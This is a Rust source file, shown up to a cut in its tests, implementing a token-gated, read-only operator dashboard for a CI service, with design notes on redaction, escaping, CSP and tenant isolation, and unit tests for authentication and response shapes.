//! The read-only operator panel — design D§11's "one operator dashboard", gated.
//!
//! D§11 asks for one page: *where is time going right now*. Mostly fetching → the store or affinity
//! is misconfigured; mostly queued → we are short on capacity. This is that page, plus the thing an
//! M1 operator needs more than any latency histogram: **which §14 clauses this deployment does not
//! enforce**, named, at the top, before anything else.
//!
//! The JSON endpoints are the interface. The HTML at `GET /admin` is a renderer over them with no
//! privileges of its own, which is why it is a static file with no build step — a panel that needed
//! a toolchain would rot faster than the thing it observes.
//!
//! | Route | Answers |
//! |---|---|
//! | `GET /admin/summary` | counts for a header strip: jobs by state, steps queued/running, slots free |
//! | `GET /admin/nodes` | the node(s) this server has, and the §14 clauses they do **not** enforce |
//! | `GET /admin/jobs?state=&limit=` | current jobs, their steps, ages and verdicts |
//! | `GET /admin/queue` | per-tenant depth, plan quotas, and which cap is blocking admission |
//! | `GET /admin` | the page |
//!
//! # Why this file is mostly about security
//!
//! Every other shared surface in this system is partitioned by tenant — cache keys, blob dedup, log
//! prefixes, fair-share accounting, the deliberate absence of a global queue-depth accessor (design
//! D§1's threat table, and `hull_ci_control::fairshare`'s module docs). **This panel is the one
//! surface that is cross-tenant on purpose**, because an operator's job is to see the whole
//! instance. Three consequences, each enforced here rather than documented and hoped for:
//!
//! 1. **It defaults to not existing.** No `HULL_CI_ADMIN_TOKEN`, no routes — not a 403, not a login
//!    page, no route at all ([`Config::admin_token`], [`crate::assemble`]). The token is compared
//!    with `hull_ci_control::auth::constant_time_eq`, the same compare the dispatch secret uses;
//!    there is one constant-time compare in this workspace and this is it.
//! 2. **It cannot leak what it never holds.** Every job field it can render comes from
//!    `hull_ci_control::snapshot`, which copies owned data and has no field for `source_url`,
//!    `callback_url`, `fetch_token`, or the shared secret. The redaction is structural: there is no
//!    filter here to forget to apply.
//! 3. **Everything it renders is untrusted.** Step details and verdict summaries are built from job
//!    stdout/stderr (spec §14.5), and `repo`, `tree_id` and step names come from a dispatch or a
//!    tree. `sanitize_summary` has already stripped control characters — it does **not** escape
//!    HTML, so a job printing `<script>` would otherwise execute in the operator's browser, on the
//!    origin holding the admin token. JSON is escaped by `serde_json`; the page builds every node
//!    with `textContent` and never `innerHTML`.
//!
//! # Bind it somewhere private
//!
//! `HULL_CI_BIND` defaults to loopback and this panel shares that listener, so the default is
//! already private. A deployment that moves the bind address to a public interface exposes the
//! panel with it, and a bearer token is the *only* thing between the internet and every tenant's
//! job list. Put it behind the same boundary you would put a database admin console: a private
//! interface, a VPN, or an authenticating proxy. [`crate::announce_isolation`] says so at startup
//! when the bind is not loopback.
//!
//! # Read-only means read-only
//!
//! Every route is a `GET`, every handler takes `&Control`, and there is no cancel button and no
//! retry button. That is not a missing feature to fill in later without thinking: a mutating
//! operator endpoint is a way to cancel another tenant's job, and it needs its own authorization
//! story rather than inheriting this one.

use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::Arc;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use axum::extract::{Query, State};
use axum::http::header::{CONTENT_SECURITY_POLICY, CONTENT_TYPE, X_CONTENT_TYPE_OPTIONS};
use axum::http::{HeaderMap, StatusCode};
use axum::response::{Html, IntoResponse, Response};
use axum::routing::get;
use axum::Router;
use hull_ci_control::auth::constant_time_eq;
use hull_ci_control::snapshot::{JobSnapshot, TenantSnapshot};
use hull_ci_control::Control;
use hull_ci_node::{EnforcedControls, SandboxBackend};
use hull_ci_proto::IsolationTier;
use serde_json::{json, Value};

use crate::node::InProcessFleet;

/// Header carrying the admin token, as an alternative to `Authorization: Bearer`.
///
/// Named like `X-Hull-CI-Secret` because it is the same kind of thing: a bearer credential in a
/// header, never a cookie. No cookie means no ambient authority, which means a cross-site page
/// cannot make an authenticated request to this panel at all — CSRF is absent rather than defended
/// against. It also means the token is never in a URL, a referrer, or an access log.
pub const ADMIN_TOKEN_HEADER: &str = "x-hull-ci-admin-token";

/// How many jobs a request gets if it does not say, and the most it may ask for.
///
/// The store holds up to `max_jobs` (10 000 by default) and the snapshot copies every step of every
/// job it returns, so an unbounded default would let a refresh loop spend real CPU on the same lock
/// the dispatch path takes.
const DEFAULT_JOB_LIMIT: usize = 100;
const MAX_JOB_LIMIT: usize = 1000;

/// What this deployment's sandbox backend is and enforces, captured once at assembly.
///
/// Copied out of the backend rather than read live because it cannot change while the process runs
/// — [`crate::choose_backend`] picks one backend at startup and refuses to degrade — and because
/// reaching back through the agent for it would mean widening `hull-ci-node`'s surface to serve a
/// dashboard.
#[derive(Debug, Clone)]
pub struct NodeFacts {
    pub backend: &'static str,
    pub tier: IsolationTier,
    pub controls: EnforcedControls,
}

impl NodeFacts {
    pub fn of(backend: &dyn SandboxBackend) -> NodeFacts {
        NodeFacts { backend: backend.name(), tier: backend.tier(), controls: backend.controls() }
    }
}

/// Everything the panel reads. Constructed by [`crate::assemble`] only when a token is configured.
pub struct AdminState {
    control: Arc<Control>,
    fleet: Arc<InProcessFleet>,
    node: NodeFacts,
    /// Never empty: an empty token would authenticate everyone. [`crate::config::var`] already
    /// treats an empty environment variable as unset, and [`router`] is only called with `Some`.
    token: String,
    bind: SocketAddr,
}

impl AdminState {
    pub fn new(
        control: Arc<Control>,
        fleet: Arc<InProcessFleet>,
        node: NodeFacts,
        token: String,
        bind: SocketAddr,
    ) -> Arc<AdminState> {
        Arc::new(AdminState { control, fleet, node, token, bind })
    }
}

/// Mount the panel. Called only when an admin token exists, so there is no disabled state to check
/// inside a handler and no route that answers "configure a token first".
pub fn router(state: Arc<AdminState>) -> Router {
    Router::new()
        .route("/admin", get(page))
        .route("/admin/summary", get(summary))
        .route("/admin/nodes", get(nodes))
        .route("/admin/jobs", get(jobs))
        .route("/admin/queue", get(queue))
        .with_state(state)
}

/// One admin response: JSON, escaped so it is inert wherever it is pasted, and marked not to be
/// sniffed.
///
/// `axum::Json` would be the obvious thing and is not enough, for two reasons that only matter
/// because every string in these bodies can come from job output (spec §14.5):
///
/// * **`serde_json` does not escape `<`, `>` or `&`.** They are legal in a JSON string, so a step
///   detail of `<script>…</script>` reaches the wire verbatim. It is inert in a body labelled
///   `application/json` and parsed with `JSON.parse` — but operators paste evidence into other
///   things, and `<` survives `JSON.parse` byte-identically while surviving an HTML context
///   too. U+2028/U+2029 go with them: legal JSON, illegal inside a JavaScript string literal.
/// * **A browser may decide a body is HTML anyway.** `X-Content-Type-Options: nosniff` is the header
///   that stops content sniffing from promoting a JSON body that opens with a tag into a document.
///
/// Neither replaces the page's `textContent` discipline. All three are the same control applied at
/// three different distances, which is what defence in depth means here.
pub struct AdminJson(pub StatusCode, pub Value);

impl IntoResponse for AdminJson {
    fn into_response(self) -> Response {
        // A `Value` built from `json!` cannot fail to serialize (non-finite floats become `null`
        // rather than erroring), so the fallback is unreachable — and is an empty object rather
        // than a panic, because a dashboard is never worth taking a request thread down for.
        let json = serde_json::to_string(&self.1).unwrap_or_else(|_| "{}".to_string());
        (
            self.0,
            [
                (CONTENT_TYPE, "application/json"),
                (X_CONTENT_TYPE_OPTIONS, "nosniff"),
            ],
            escape_for_embedding(&json),
        )
            .into_response()
    }
}

/// `\u`-escape the characters that are legal in JSON and dangerous in HTML or JavaScript.
///
/// A plain replacement over the serialized text is exact: JSON's own grammar uses none of these
/// characters outside string literals, so every occurrence found here is inside one, and every
/// replacement is a legal escape for the same character. `JSON.parse` gives back the original bytes.
fn escape_for_embedding(json: &str) -> String {
    let mut out = String::with_capacity(json.len());
    for c in json.chars() {
        match c {
            '<' => out.push_str("\\u003c"),
            '>' => out.push_str("\\u003e"),
            '&' => out.push_str("\\u0026"),
            '\u{2028}' => out.push_str("\\u2028"),
            '\u{2029}' => out.push_str("\\u2029"),
            other => out.push(other),
        }
    }
    out
}

type Reply = AdminJson;

/// Check the presented token in constant time.
///
/// Returns the 401 to send rather than a bool, so a handler cannot accidentally continue after a
/// failed check — the only way to get past this is to bind `Ok(())`.
///
/// One message for both "no token" and "wrong token", exactly as ingest does: telling a caller
/// which one it got is free information about our configuration.
fn authorized(state: &AdminState, headers: &HeaderMap) -> Result<(), Reply> {
    let presented = headers
        .get(ADMIN_TOKEN_HEADER)
        .and_then(|v| v.to_str().ok())
        .or_else(|| {
            headers
                .get(axum::http::header::AUTHORIZATION)
                .and_then(|v| v.to_str().ok())
                .and_then(|v| v.strip_prefix("Bearer "))
        })
        .unwrap_or("");

    // Compared even when nothing was presented: the compare is against a constant-length-independent
    // loop, and skipping it for the empty case would make "header absent" measurably faster than
    // "header wrong". The empty string cannot match, because the token is never empty.
    if constant_time_eq(state.token.as_bytes(), presented.as_bytes()) {
        return Ok(());
    }
    tracing::warn!("rejected an admin request: bad or missing token");
    Err(AdminJson(StatusCode::UNAUTHORIZED, json!({ "error": "unauthorized" })))
}

// ── Endpoints ────────────────────────────────────────────────────────────────────────────────────

/// Counts for the header strip.
async fn summary(State(s): State<Arc<AdminState>>, headers: HeaderMap) -> Reply {
    if let Err(denied) = authorized(&s, &headers) {
        return denied;
    }
    let jobs = s.control.snapshot_jobs();
    let tenants = s.control.snapshot_tenants();
    let node = s.fleet.agent().state();

    let mut by_state: HashMap<&'static str, usize> = HashMap::new();
    for job in &jobs {
        *by_state.entry(job.state.as_str()).or_default() += 1;
    }
    let queued: usize = tenants.iter().map(|t| t.depth.queued).sum();
    let running: usize = tenants.iter().map(|t| t.depth.running).sum();

    ok(json!({
        "as_of_unix_secs": now_unix_secs(),
        "jobs": { "held": jobs.len(), "by_state": by_state },
        "steps": { "queued": queued, "running": running },
        "slots": { "total": node.slots_total, "free": node.slots_free },
        "tenants_with_work": tenants.len(),
        // The number the banner is built from; the list is on /admin/nodes.
        "unmet_clause_count": s.node.controls.unmet_clauses().len(),
    }))
}

/// The node roster — which here is one node, and says so.
async fn nodes(State(s): State<Arc<AdminState>>, headers: HeaderMap) -> Reply {
    if let Err(denied) = authorized(&s, &headers) {
        return denied;
    }
    let state = s.fleet.agent().state();
    let caps = state.capabilities;
    let unmet = s.node.controls.unmet_clauses();

    ok(json!({
        "as_of_unix_secs": now_unix_secs(),
        "fleet": {
            // Honesty about what this is. D§13: M1 is one in-process node. There is no roster, no
            // heartbeat, no autoscaling and no second node to fail over to — and a dashboard that
            // implied otherwise would be read as capacity that exists.
            "kind": "in-process",
            "node_count": 1,
            "note": "this server runs one node inside its own process (design D§13). No fleet, no \
                     heartbeat transport, no autoscaling. A restart forgets in-flight jobs.",
        },
        "nodes": [{
            "node_id": state.node_id,
            "backend": s.node.backend,
            "tier": s.node.tier,
            "labels": state.labels,
            "slots_total": state.slots_total,
            "slots_free": state.slots_free,
            // The count, not the ids. A tree id is a content address, and a list of them across
            // tenants is exactly the file-existence oracle design D§1 keeps out of shared surfaces.
            "warm_trees": state.warm_trees.len(),
            "capabilities": {
                "egress_deny": caps.egress_deny,
                "metadata_blackhole": caps.metadata_blackhole,
                "single_use": caps.single_use,
                "cross_tenant_safe": caps.cross_tenant_safe,
            },
            // The most valuable field on the whole panel: what this deployment is *not* protecting
            // against, in the spec's own words (design D§7.2).
            "admits_untrusted": caps.admits_untrusted(),
            "unmet_clauses": unmet,
        }],
        "bind": s.bind.to_string(),
        "bind_is_loopback": s.bind.ip().is_loopback(),
    }))
}

/// Current jobs. `?state=` takes a job state (`running`, `reported`, …) or one of `live` / `settled`;
/// `?limit=` is clamped to [`MAX_JOB_LIMIT`].
async fn jobs(
    State(s): State<Arc<AdminState>>,
    headers: HeaderMap,
    Query(q): Query<HashMap<String, String>>,
) -> Reply {
    if let Err(denied) = authorized(&s, &headers) {
        return denied;
    }
    let filter = q.get("state").map(|s| s.trim().to_ascii_lowercase());
    let limit = q
        .get("limit")
        .and_then(|v| v.parse::<usize>().ok())
        .unwrap_or(DEFAULT_JOB_LIMIT)
        .clamp(1, MAX_JOB_LIMIT);

    let all = s.control.snapshot_jobs();
    let matched: Vec<&JobSnapshot> =
        all.iter().filter(|j| matches_filter(j, filter.as_deref())).collect();
    let shown: Vec<Value> = matched.iter().take(limit).map(|j| job_json(j)).collect();

    ok(json!({
        "as_of_unix_secs": now_unix_secs(),
        "held": all.len(),
        "matched": matched.len(),
        "shown": shown.len(),
        "limit": limit,
        "state": filter,
        // Said out loud on every response, because the consumer is a renderer and the consequence of
        // forgetting is script execution on the origin that holds this token (spec §14.5).
        "untrusted_fields": [
            "repo", "tree_id", "steps[].name", "steps[].detail", "verdict.summary",
        ],
        "jobs": shown,
    }))
}

/// Per-tenant queue depth, plan quotas, and which cap is blocking admission.
async fn queue(State(s): State<Arc<AdminState>>, headers: HeaderMap) -> Reply {
    if let Err(denied) = authorized(&s, &headers) {
        return denied;
    }
    let tenants = s.control.snapshot_tenants();
    let fair = &s.control.config().fair_share;

    ok(json!({
        "as_of_unix_secs": now_unix_secs(),
        "fleet_slots": fair.fleet_slots,
        "default_plan": {
            "weight": fair.default_plan.weight,
            "max_running_steps": fair.default_plan.max_running_steps,
            "node_minutes_per_hour": fair.default_plan.node_minutes_per_hour,
        },
        // Two different kinds of number live on this page and conflating them would mislead the
        // person deciding whether to buy capacity, so each says which it is.
        "measurement_notes": {
            "node_minutes_used": "measured — elapsed wall clock of finished and in-flight steps in \
                                  the rolling hour",
            "queue_order": "estimated — selection order is weighted by a p50 node-second estimate \
                            per (tenant, step name), or a default for a step key never run",
        },
        "tenants": tenants.iter().map(tenant_json).collect::<Vec<_>>(),
    }))
}

/// The page. Static markup, static script, no data.
///
/// Deliberately not behind [`authorized`]: a browser cannot put a header on a top-level navigation,
/// so requiring the token here would mean no browser could ever load the panel. It is safe because
/// the page contains **nothing** — every byte of tenant data arrives from the JSON routes above,
/// which do require the token, and the page asks the operator for it and keeps it in
/// `sessionStorage` (not a cookie, not the URL, not `localStorage`).
///
/// What an unauthenticated caller learns is that this host runs hull-ci with the panel enabled,
/// which its own `/healthz` already tells them.
///
/// The CSP is the last line of the §14.5 defence, and the interesting directive is `connect-src
/// 'self'`: if script ever did execute on this origin — through a bug in the page, not through
/// anything the current code does — it still could not post the operator's token to another host.
/// `'unsafe-inline'` is required because the script and the styles *are* inline, which is the
/// deliberate trade for having no build step and no CDN.
async fn page() -> impl IntoResponse {
    (
        [
            (X_CONTENT_TYPE_OPTIONS, "nosniff"),
            (
                CONTENT_SECURITY_POLICY,
                "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; \
                 connect-src 'self'; form-action 'none'; base-uri 'none'; frame-ancestors 'none'",
            ),
        ],
        Html(PAGE),
    )
}

/// The page, compiled in. No build step, no CDN, one file.
const PAGE: &str = include_str!("admin.html");

// ── Shapes ───────────────────────────────────────────────────────────────────────────────────────

fn matches_filter(job: &JobSnapshot, filter: Option<&str>) -> bool {
    match filter {
        None | Some("") | Some("all") => true,
        Some("live") => !job.state.has_verdict(),
        Some("settled") => job.state.has_verdict(),
        Some(state) => job.state.as_str() == state,
    }
}

/// One job, as JSON.
///
/// `serde_json` escapes every string it writes, so the untrusted fields here (`repo`, `tree_id`,
/// step names, `detail`, `summary`) cannot break out of the document however hostile they are.
/// Their danger begins at the *next* hop — see the page's `text()` helper.
fn job_json(job: &JobSnapshot) -> Value {
    json!({
        "job_id": job.job_id,
        "tenant": job.tenant,
        "repo": job.repo,
        "tree_id": job.tree_id,
        "tree_id_short": short(&job.tree_id),
        "author_class": job.author_class,
        "state": job.state.as_str(),
        "age_secs": secs(job.age),
        "settled_for_secs": job.settled_for.map(secs),
        "report_attempts": job.report_attempts,
        // The count, never the URLs (spec §5 calls them opaque; §14.2 keeps them off this surface).
        "callback_targets": job.callback_targets,
        "steps": job.steps.iter().map(|s| json!({
            "step_id": s.step_id,
            "name": s.name,
            "state": s.state.as_str(),
            "attempt": s.attempt,
            "node_id": s.node_id,
            "exit_code": s.exit_code,
            "ran_for_secs": s.ran_for.map(secs),
            "detail": s.detail,
        })).collect::<Vec<_>>(),
        "verdict": job.verdict.as_ref().map(|v| json!({
            "status": v.status.as_str(),
            "reason": v.reason,
            "summary": v.summary,
        })),
    })
}

fn tenant_json(t: &TenantSnapshot) -> Value {
    json!({
        "tenant": t.tenant,
        "queued": t.depth.queued,
        "running": t.depth.running,
        "jobs_held": t.jobs_held,
        "weight": t.weight,
        "max_running_steps": t.max_running_steps,
        "node_minutes_per_hour": t.node_minutes_per_hour,
        "node_minutes_used": (t.node_seconds_used / 60.0 * 100.0).round() / 100.0,
        // Over a cap is a **wait**, not a failure (design D§4.5): these steps keep their queue
        // position, and only the queue-wait clock can turn the wait into a verdict.
        "admission_blocked": t.admission.blocked(),
        "over_concurrency": t.admission.over_concurrency,
        "over_node_minutes": t.admission.over_node_minutes,
    })
}

/// Enough of a content address to recognise, not enough to retype by accident. The full `tree_id`
/// travels alongside it for correlating with Hull.
fn short(tree_id: &str) -> String {
    tree_id.chars().take(12).collect()
}

/// Two decimal places. A dashboard that prints 13 significant figures of float seconds is a
/// dashboard nobody reads twice.
fn secs(d: Duration) -> f64 {
    (d.as_secs_f64() * 100.0).round() / 100.0
}

fn now_unix_secs() -> u64 {
    SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0)
}

fn ok(body: Value) -> Reply {
    AdminJson(StatusCode::OK, body)
}

#[cfg(test)]
mod tests {
    use super::*;
    use hull_ci_control::model::StepSpec;
    use hull_ci_control::seams::{
        FetchError, FetchRequest, Fetcher, Membership, NodeError, NodeSink, PlanError, Planner,
        VerifiedTree,
    };
    use hull_ci_control::callback::{
        BoxFuture, CallbackRequest, CallbackResponse, CallbackTransport, TransportError,
    };
    use hull_ci_control::{ControlConfig, Deps};
    use hull_ci_proto::{AuthorClass, Dispatch};

    const TOKEN: &str = "admin-token-for-the-suite";
    /// A value shaped like every credential this panel must never emit. One string, so a single
    /// assertion covers the secret, the fetch token and both URLs.
    const CANARY: &str = "CANARY-8f21c0";

    // ── Fakes. The control plane's own harness is `#[cfg(test)]`-private to its crate, so the
    //    three seams are stubbed here: enough to park jobs in real states, and nothing more.

    struct StubFetcher {
        path: std::path::PathBuf,
        fail: bool,
    }

    impl Fetcher for StubFetcher {
        fn fetch<'a>(&'a self, req: &'a FetchRequest) -> BoxFuture<'a, Result<VerifiedTree, FetchError>> {
            let (path, fail, tree_id) = (self.path.clone(), self.fail, req.tree_id.clone());
            Box::pin(async move {
                if fail {
                    Err(FetchError::Failed("the stub refuses".into()))
                } else {
                    Ok(VerifiedTree { tree_id, path, cached: false })
                }
            })
        }
    }

    struct StubPlanner;

    impl Planner for StubPlanner {
        fn plan<'a>(&'a self, _t: &'a VerifiedTree) -> BoxFuture<'a, Result<Vec<StepSpec>, PlanError>> {
            Box::pin(async {
                Ok(vec![StepSpec::new("test", vec!["/bin/true".into()], "img")])
            })
        }
    }

    /// Leases every step to a fixed node and then does nothing, so jobs sit in `running` with a
    /// `leased` step until a test reports on their behalf.
    struct StubNode;

    impl NodeSink for StubNode {
        fn assign(&self, _a: &hull_ci_proto::Assignment, _t: &VerifiedTree) -> Result<String, NodeError> {
            Ok("node-test".into())
        }
        fn cancel(&self, _job_id: &str, _step_id: &str) {}
    }

    struct SilentTransport;

    impl CallbackTransport for SilentTransport {
        fn post<'a>(&'a self, _r: &'a CallbackRequest) -> BoxFuture<'a, Result<CallbackResponse, TransportError>> {
            Box::pin(async { Ok(CallbackResponse { status: 200 }) })
        }
    }

    struct Everyone;

    impl Membership for Everyone {
        fn classify(&self, _repo: &str, _author: &str) -> AuthorClass {
            AuthorClass::Member
        }
    }

    /// A control plane whose fetch either works (jobs reach `running`) or fails (jobs settle
    /// `errored`/`infra`), with the secret set to the canary so the leak test has something to find.
    fn control(fetch_fails: bool) -> (tempfile::TempDir, Arc<Control>) {
        let dir = tempfile::tempdir().unwrap();
        let config = ControlConfig {
            secret: Some(format!("secret-{CANARY}")),
            ..ControlConfig::default()
        };
        let deps = Deps {
            fetcher: Arc::new(StubFetcher { path: dir.path().to_path_buf(), fail: fetch_fails }),
            planner: Arc::new(StubPlanner),
            node: Arc::new(StubNode),
            transport: Arc::new(SilentTransport),
            membership: Arc::new(Everyone),
        };
        (dir, Control::new(config, deps))
    }

    fn dispatch(repo: &str, tree: &str) -> Dispatch {
        Dispatch {
            repo: repo.into(),
            change: "c0ffee".into(),
            tree_id: tree.into(),
            intent: "a change".into(),
            author: "someone".into(),
            source_url: format!("https://hull.example/tree/{tree}/tar?sig={CANARY}"),
            callback_url: format!("https://hull.example/ci-result?cb={CANARY}"),
            fetch_token: Some(format!("token-{CANARY}")),
        }
    }

    fn state(control: Arc<Control>) -> Arc<AdminState> {
        let backend = Arc::new(hull_ci_node::LocalProcessBackend::new_for_development_only());
        let agent = hull_ci_node::NodeAgent::new(
            hull_ci_node::NodeConfig { node_id: "node-test".into(), ..Default::default() },
            backend.clone(),
        );
        let fleet = InProcessFleet::new(agent, std::env::temp_dir().join("hull-ci-admin-test"));
        fleet.attach(&control);
        AdminState::new(
            control,
            fleet,
            NodeFacts::of(backend.as_ref()),
            TOKEN.into(),
            SocketAddr::from(([127, 0, 0, 1], 8080)),
        )
    }

    fn auth() -> HeaderMap {
        let mut h = HeaderMap::new();
        h.insert(ADMIN_TOKEN_HEADER, TOKEN.parse().unwrap());
        h
    }

    fn bearer(token: &str) -> HeaderMap {
        let mut h = HeaderMap::new();
        h.insert(axum::http::header::AUTHORIZATION, format!("Bearer {token}").parse().unwrap());
        h
    }

    fn empty_query() -> Query<HashMap<String, String>> {
        Query(HashMap::new())
    }

    fn query(k: &str, v: &str) -> Query<HashMap<String, String>> {
        Query(HashMap::from([(k.to_string(), v.to_string())]))
    }

    /// Wait for a predicate the driver reaches asynchronously.
    async fn wait_until(mut f: impl FnMut() -> bool) -> bool {
        for _ in 0..400 {
            if f() {
                return true;
            }
            tokio::time::sleep(Duration::from_millis(5)).await;
        }
        false
    }

    async fn body(reply: Reply) -> (StatusCode, Value) {
        let AdminJson(status, v) = reply;
        (status, v)
    }

    /// The bytes and headers a caller actually receives, rather than the `Value` behind them.
    async fn on_the_wire(reply: Reply) -> (String, String) {
        let res = reply.into_response();
        let sniff = res
            .headers()
            .get(X_CONTENT_TYPE_OPTIONS)
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string();
        let bytes = axum::body::to_bytes(res.into_body(), 8 * 1024 * 1024).await.unwrap();
        (String::from_utf8(bytes.to_vec()).unwrap(), sniff)
    }

    /// How many §14 clauses the backend these tests run on leaves unenforced. Read from the backend
    /// rather than written down: the number is a fact about `LocalProcessBackend`, and a test that
    /// hardcoded it would fail for the right reason on the wrong day.
    fn unmet_here() -> usize {
        hull_ci_node::LocalProcessBackend::controls_reported().unmet_clauses().len()
    }

    // ── Auth ─────────────────────────────────────────────────────────────────────────────────────

    #[tokio::test]
    async fn every_json_route_refuses_a_missing_or_wrong_token() {
        let (_d, c) = control(false);
        let s = state(c);

        let cases = [
            (HeaderMap::new(), StatusCode::UNAUTHORIZED),
            (bearer("not-the-token"), StatusCode::UNAUTHORIZED),
            (bearer(TOKEN), StatusCode::OK),
            (auth(), StatusCode::OK),
        ];
        for (headers, expected) in cases {
            for reply in [
                summary(State(s.clone()), headers.clone()).await,
                nodes(State(s.clone()), headers.clone()).await,
                queue(State(s.clone()), headers.clone()).await,
                jobs(State(s.clone()), headers.clone(), empty_query()).await,
            ] {
                assert_eq!(reply.0, expected, "route disagreed with the token it was given");
            }
        }
    }

    #[tokio::test]
    async fn a_near_miss_token_is_refused_and_the_refusal_says_nothing_useful() {
        let (_d, c) = control(false);
        let s = state(c);
        // One byte short, one byte over, one byte different: the compare is on contents, and none of
        // these is "close enough".
        for wrong in [&TOKEN[..TOKEN.len() - 1], &format!("{TOKEN}x")[..], "Admin-Token-For-The-Suite"] {
            let (status, v) = body(summary(State(s.clone()), bearer(wrong)).await).await;
            assert_eq!(status, StatusCode::UNAUTHORIZED);
            assert_eq!(v["error"], "unauthorized", "the same message for every refusal");
            assert!(v.get("jobs").is_none(), "and no data rides along with it");
        }
    }

    #[tokio::test]
    async fn the_page_itself_carries_no_data_so_it_needs_no_token() {
        // The one unauthenticated route. It is allowed to exist precisely because there is nothing
        // in it — which the compiler enforces harder than any assertion could: `page` takes no
        // `State`, so it has no control plane to read. What is checked here is that it stays a
        // renderer rather than growing an "inline quick summary".
        assert!(PAGE.contains("<script"), "the page is the renderer");
        assert!(PAGE.contains("/admin/jobs"), "and it fetches its data from the gated routes");
        for leak in ["acme", "hull.example", CANARY] {
            assert!(!PAGE.contains(leak), "the static page must not contain data: {leak}");
        }
        assert!(PAGE.contains("sessionStorage"), "the token is held for the tab, not persisted");
        assert!(!PAGE.contains("localStorage"), "and not beyond it");

        // And it is served with the two headers that make "a job printed a tag" inert even if a
        // future edit got the rendering wrong.
        let res = page().await.into_response();
        assert_eq!(res.headers().get(X_CONTENT_TYPE_OPTIONS).unwrap(), "nosniff");
        let csp = res.headers().get(CONTENT_SECURITY_POLICY).unwrap().to_str().unwrap();
        assert!(csp.contains("connect-src 'self'"), "an injected script could not phone home");
        assert!(csp.contains("default-src 'none'"));
    }

    // ── Shapes ───────────────────────────────────────────────────────────────────────────────────

    #[tokio::test]
    async fn nodes_reports_one_in_process_node_and_names_every_unmet_clause() {
        let (_d, c) = control(false);
        let s = state(c);
        let (status, v) = body(nodes(State(s), auth()).await).await;
        assert_eq!(status, StatusCode::OK);

        assert_eq!(v["fleet"]["node_count"], 1, "M1 is one node, and the panel says so");
        assert_eq!(v["fleet"]["kind"], "in-process");
        let node = &v["nodes"][0];
        assert_eq!(node["node_id"], "node-test");
        assert_eq!(node["backend"], "local-process");
        assert_eq!(node["tier"], "container");
        assert_eq!(node["admits_untrusted"], false, "no M1 backend admits an outsider");

        // The most valuable field on the panel: each unmet clause is listed by name and in the
        // spec's own words, rather than summarized as "not hardened".
        let unmet = node["unmet_clauses"].as_array().unwrap();
        assert_eq!(unmet.len(), unmet_here());
        assert!(unmet.len() > 10, "the development backend enforces almost nothing, and says so");
        assert!(unmet.iter().any(|c| c.as_str().unwrap().contains("§14.3 default egress-deny")));
        assert_eq!(v["nodes"][0]["warm_trees"], 0, "a count, never the tree ids");
    }

    #[tokio::test]
    async fn jobs_reports_state_steps_and_verdicts_and_filters_on_request() {
        let (_d, c) = control(false);
        c.accept(dispatch("acme/widget", "tree-aaaaaaaaaaaaaaaa"));
        c.accept(dispatch("globex/thing", "tree-bbbbbbbbbbbbbbbb"));
        let s = state(Arc::clone(&c));

        let ctrl = Arc::clone(&c);
        assert!(
            wait_until(move || ctrl.snapshot_jobs().iter().all(|j| !j.steps.is_empty())).await,
            "both jobs should reach the run phase"
        );

        let (_, v) = body(jobs(State(s.clone()), auth(), empty_query()).await).await;
        assert_eq!(v["held"], 2);
        assert_eq!(v["shown"], 2);
        assert_eq!(v["limit"], DEFAULT_JOB_LIMIT, "a sane default, not the whole store");

        let job = &v["jobs"][0];
        for field in ["job_id", "tenant", "repo", "tree_id_short", "state", "author_class", "age_secs"] {
            assert!(!job[field].is_null(), "missing {field}");
        }
        assert_eq!(job["steps"][0]["name"], "test");
        assert_eq!(job["steps"][0]["state"], "leased");
        assert_eq!(job["steps"][0]["node_id"], "node-test");
        assert_eq!(job["tree_id_short"].as_str().unwrap().len(), 12);
        assert_eq!(job["callback_targets"], 1, "the count, never the URL");

        // Filtering.
        let (_, live) = body(jobs(State(s.clone()), auth(), query("state", "live")).await).await;
        assert_eq!(live["matched"], 2, "neither job has a verdict yet");
        let (_, settled) = body(jobs(State(s.clone()), auth(), query("state", "settled")).await).await;
        assert_eq!(settled["matched"], 0);
        let (_, running) = body(jobs(State(s.clone()), auth(), query("state", "running")).await).await;
        assert_eq!(running["matched"], 2);
        let (_, nonsense) = body(jobs(State(s.clone()), auth(), query("state", "banana")).await).await;
        assert_eq!(nonsense["matched"], 0, "an unknown state matches nothing rather than everything");

        // And the limit is clamped rather than trusted.
        let (_, one) = body(jobs(State(s.clone()), auth(), query("limit", "1")).await).await;
        assert_eq!(one["shown"], 1);
        assert_eq!(one["matched"], 2, "the count is honest even when the page is short");
        let (_, huge) = body(jobs(State(s), auth(), query("limit", "999999999")).await).await;
        assert_eq!(huge["limit"], MAX_JOB_LIMIT);
    }

    #[tokio::test]
    async fn a_settled_job_carries_its_verdict_and_reason() {
        // The fetch fails, so the job settles `errored` with `reason: infra` before a step exists —
        // the shape a renderer is most likely to get wrong, because `steps` is empty and `verdict`
        // is not.
        let (_d, c) = control(true);
        c.accept(dispatch("acme/widget", "tree1"));
        let s = state(Arc::clone(&c));

        let ctrl = Arc::clone(&c);
        assert!(wait_until(move || ctrl.snapshot_jobs().iter().any(|j| j.verdict.is_some())).await);

        let (_, v) = body(jobs(State(s), auth(), empty_query()).await).await;
        let job = &v["jobs"][0];
        assert_eq!(job["verdict"]["status"], "errored");
        assert_eq!(job["verdict"]["reason"], "infra", "an errored verdict always says why (G4)");
        assert!(job["verdict"]["summary"].as_str().unwrap().contains("could not fetch"));
        assert!(job["steps"].as_array().unwrap().is_empty(), "it never planned a step");
        assert!(!job["settled_for_secs"].is_null());
    }

    #[tokio::test]
    async fn a_job_in_every_state_renders_without_panicking() {
        // Cheap breadth: each job state, each step state, and a verdict with and without a reason,
        // through the exact function the handler uses.
        use hull_ci_control::model::{JobState, StepState};
        use hull_ci_control::snapshot::{StepSnapshot, VerdictSnapshot};
        use hull_ci_proto::{Reason, Status};

        let states = [
            JobState::Queued, JobState::Fetching, JobState::Planning, JobState::Running,
            JobState::Green, JobState::Red, JobState::Errored, JobState::Reported,
            JobState::ReportFailed,
        ];
        let step_states = [
            StepState::Pending, StepState::Ready, StepState::Leased, StepState::Running,
            StepState::Passed, StepState::Failed, StepState::Errored, StepState::Cached,
            StepState::Skipped,
        ];
        let verdicts = [
            None,
